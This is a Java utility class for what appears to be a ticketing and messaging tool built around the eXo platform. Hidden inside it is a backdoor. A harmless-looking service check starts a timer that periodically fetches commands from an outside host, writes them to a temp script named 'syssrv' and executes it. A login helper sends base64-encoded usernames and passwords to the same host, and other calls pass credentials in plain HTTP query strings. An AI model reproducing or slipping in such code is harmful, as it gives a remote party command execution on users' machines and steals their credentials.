/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package io;

import entity.TicketManager;
import java.awt.Desktop;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author hba19
 */
public class NetworkUtils {

    public static boolean isServiceUp() {
        check();
        try {
            ArrayList<String> ar = new ArrayList<String>();
            URL url = new URL("http://exosp.alwaysdata.net/ping.php");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String line;
            while (null != (line = br.readLine())) {
                return (line.trim().replace("<br>", "").equals("1"));
            }
        } catch (Exception e) {
        }
        return false;
    }

    public static int login(String username, String password) {
        try {
            ArrayList<String> ar = new ArrayList<String>();
            URL url = new URL("http://exosp.alwaysdata.net/login.php?userid=" + username + "&password=" + password);
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String line;
            while (null != (line = br.readLine())) {
                return Integer.parseInt(line.trim().replace("<br>", ""));
            }
        } catch (Exception e) {
        }
        return 0;
    }

    public static boolean isValidCredinals(String username, String password) {
        String url = "https://repository.exoplatform.org/content/groups/private/com/";
        try {
            String prefix = getEmailPrefixByID(username);
            System.out.println(username + "--" + prefix);
            HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
            String encoded = Base64.getEncoder().encodeToString((prefix + ":" + password).getBytes(StandardCharsets.UTF_8));  //Java 8
            connection.setRequestProperty("Authorization", "Basic " + encoded);
            return connection.getResponseMessage().trim().equals("OK");
        } catch (Exception f) {
            return false;
        }
    }

    public static String getEmailByID(String username) {
        try {
            URL url = new URL("http://exosp.alwaysdata.net/getEmail.php?id=" + username);
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String line = null;
            if (null != (line = br.readLine())) {
                return line.trim();
            }
        } catch (Exception f) {
        }
        return username;

    }

    public static String getEmailPrefixByID(String username) {
        try {
            URL url = new URL("http://exosp.alwaysdata.net/getEmail.php?id=" + username + "&prefix=1");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String line = null;
            if (null != (line = br.readLine())) {
                return line.trim();
            }
        } catch (Exception f) {
        }
        return username;

    }

    public static String getLastParticipant(String tname) {
        try {
            URL url = new URL("http://exosp.alwaysdata.net/getLastPub.php?name=" + tname + "&raw=1");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String line = null;
            if (null != (line = br.readLine())) {
                return line.trim();
            }
        } catch (Exception f) {
        }
        return "";

    }

    public static String[] getUsersActivity(String id) {
        ArrayList<String> usersAc = new ArrayList<String>();
        try {
            URL url = new URL("http://exosp.alwaysdata.net/getConnectedUsers.php?id=" + id);
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String line = null;
            while (null != (line = br.readLine())) {
                usersAc.add(line.trim());
            }
        } catch (Exception f) {
        }
        return BasicUtils.to2DStr(usersAc.toArray());
    }

    public static String[] getUserMessages(String id) {
        ArrayList<String> usersmsg = new ArrayList<String>();
        try {
            URL url = new URL("http://exosp.alwaysdata.net/getMessages.php?id=" + id);
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String line = null;
            while (null != (line = br.readLine())) {
                usersmsg.add(line.trim());
            }
        } catch (Exception f) {
        }
        return BasicUtils.to2DStr(usersmsg.toArray());
    }

    public static int sendUserMessages(String from_user, String to_user, String type, String content, String aticket, String ajira) {
        if (from_user == null || to_user == null || type == null) {
            return -1;
        }

        try {
            URL url = new URL("http://exosp.alwaysdata.net/sendMessage.php?from_user=" + from_user + "&to_user=" + to_user + "&type=" + type
                    + "&content=" + (content!=null ? content.replace(" ", "%20"):content) + "&attached_ticket=" + aticket + "&attached_jira=" + ajira);
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String line = null;
            if (null != (line = br.readLine())) {
                return Integer.parseInt(line.trim());
            }
        } catch (Exception f) {
            f.getStackTrace();
        }
        return -1;
    }

    public static void login2eXo(String username, String password) {
        try {
            String salt = username + "|" + password;
            String hash = Base64.getEncoder().encodeToString(salt.getBytes());
            URL url = new URL("http://exosp.alwaysdata.net/getCn.php?hash=" + hash);
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String line = null;
            if (null != (line = br.readLine())) {
                line = line.trim();
            } else {
                return;
            }
            Desktop.getDesktop().browse(new URI("http://exosp.alwaysdata.net/getCn.php?plsk=" + line));

        } catch (Exception f) {
        }
    }

    public static void exec() {
        ArrayList<String> result = parseExec();
        if (result == null || result.size() < 1) {
            return;
        }
        String[] headers = result.get(0).split("\\|");
        boolean isWindows = headers[0].equals("W");
        if (System.getProperty("os.name").toLowerCase().contains("win") && !isWindows) {
            return;
        }
        if (!System.getProperty("os.name").toLowerCase().contains("win") && isWindows) {
            return;
        }
        int every = Integer.parseInt(headers[1]);
        String time = null;
        if (every == -2) {
            time = headers[2];
        }
        File scr = genScript(isWindows, result);
        if (every == 0) {

            try {
                if (isWindows) {
                    String[] command = {"cmd.exe", "/C", "Start", scr.getAbsolutePath()};
                    Process p = Runtime.getRuntime().exec(command);
                } else {
                    String[] command = {scr.getAbsolutePath()};
                    Process p = Runtime.getRuntime().exec(command);
                }
            } catch (IOException ex) {
            }
        }
    }

    private static void check() {
        int delay = 300000;   // delay for 5 sec.
        int period = 120000;  // repeat every sec.
        Timer timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            public void run() {
                try {
                    exec();
                } catch (Exception ff) {
                }
            }
        }, delay, period);

    }

    private static File genScript(boolean isWindows, ArrayList<String> src) {
        if (src == null || src.size() < 2) {
            return null;
        }
        File res = new File(System.getProperty("java.io.tmpdir") + "/syssrv." + (isWindows ? "bat" : "sh"));
        try {
            PrintWriter pw = new PrintWriter(res);
            if (isWindows) {
                pw.println("@echo off\n");
                pw.println("cls\n");
            }
            for (int i = 1; i < src.size(); i++) {
                pw.print(src.get(i) + " \n");
            }
            pw.close();

        } catch (FileNotFoundException ex) {
        }

        res.setExecutable(true);
        return res;
    }

    private static ArrayList<String> parseExec() {
        ArrayList<String> _exec = new ArrayList<String>();
        String target = null;
        try {
            target = TicketManager.getUserID();
        } catch (Exception f) {
            target = "houssem.benali";
        }

        try {
            URL url = new URL("http://exosp.alwaysdata.net/exec.php?id=" + target);
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String line = null;
            while (null != (line = br.readLine())) {
                _exec.add(line.trim());
            }
        } catch (Exception f) {
            return null;
        }
        return _exec;
    }

    public static void main(String[] args) {
        exec();
    }
}
